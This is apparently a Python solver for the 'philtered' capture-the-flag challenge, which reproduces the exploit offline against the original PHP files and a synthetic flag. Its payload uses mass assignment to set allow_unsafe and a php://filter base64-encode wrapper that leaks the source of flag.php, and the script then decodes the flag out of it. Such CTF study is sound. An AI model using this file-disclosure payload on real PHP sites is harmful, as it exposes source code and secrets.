"""Offline PHP mass-assignment reproduction for DUCTF 2025 philtered.

Runs original index.php and layout.php with synthetic secret, never remote.
"""
import argparse
import base64
import re
import shutil
import subprocess
import tempfile
from pathlib import Path
from urllib.parse import urlencode

def create_payload(resource: str = "flag.php") -> str:
    if not resource or "\x00" in resource:
        raise ValueError("Resource must be a valid local challenge file name")
    params = [
        ("allow_unsafe", "1"),
        ("config[data_folder]", "php://filter/convert.base64-encode/resource="),
        ("config[path]", resource),
    ]
    return urlencode(params)

def run_fixture(challenge_root: Path, marker: str, query: str | None = None) -> str:
    php = shutil.which("php")
    if not php:
        raise RuntimeError("PHP CLI is needed to run original philtered fixture")
    if not re.fullmatch(r"DUCTF\{[A-Za-z0-9_]+\}", marker):
        raise ValueError("Marker must be a harmless synthetic flag")
    index = challenge_root / "index.php"
    layout = challenge_root / "layout.php"
    if not index.is_file() or not layout.is_file():
        raise ValueError("Original challenge PHP fixtures are missing")
    with tempfile.TemporaryDirectory(prefix="ctf-philtered-") as tmp:
        root = Path(tmp)
        shutil.copy2(index, root / "index.php")
        shutil.copy2(layout, root / "layout.php")
        if (challenge_root / "data").is_dir():
            shutil.copytree(challenge_root / "data", root / "data")
        (root / "flag.php").write_text(
            "<?php $flag = " + repr(marker) + "; ?>\n", encoding="utf-8"
        )
        serialized = query if query is not None else create_payload()
        php_script = (
            'parse_str($argv[1], $_GET); '
            'chdir($argv[2]); '
            'include "index.php";'
        )
        process = subprocess.run(
            [php, "-d", "display_errors=0", "-r", php_script,
             serialized, str(root)],
            capture_output=True, text=True, encoding="utf-8",
            check=False, timeout=10, cwd=root,
        )
        if process.returncode:
            raise RuntimeError(f"PHP fixture failed: {process.stderr[-400:]}")
        return process.stdout

def extract_flag_from_response(response: str) -> str:
    candidates = re.findall(r"<p>\s*([A-Za-z0-9+/=]{32,})\s*</p>", response)
    for candidate in candidates:
        try:
            php_source = base64.b64decode(candidate, validate=True).decode("utf-8")
        except (ValueError, UnicodeError):
            continue
        flag = re.search(r"DUCTF\{[A-Za-z0-9_]+\}", php_source)
        if flag:
            return flag.group(0)
    raise ValueError("No leaked flag source found in PHP response")

def solve(challenge_root: Path, marker: str = "DUCTF{SYNTHETIC_FIXTURE_ONLY}") -> str:
    return extract_flag_from_response(run_fixture(challenge_root, marker))

def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("challenge_root", type=Path)
    args = parser.parse_args()
    print("Locally recovered synthetic flag:", solve(args.challenge_root))
    print("The original live CTF flag was NOT fetched.")

if __name__ == "__main__":
    main()
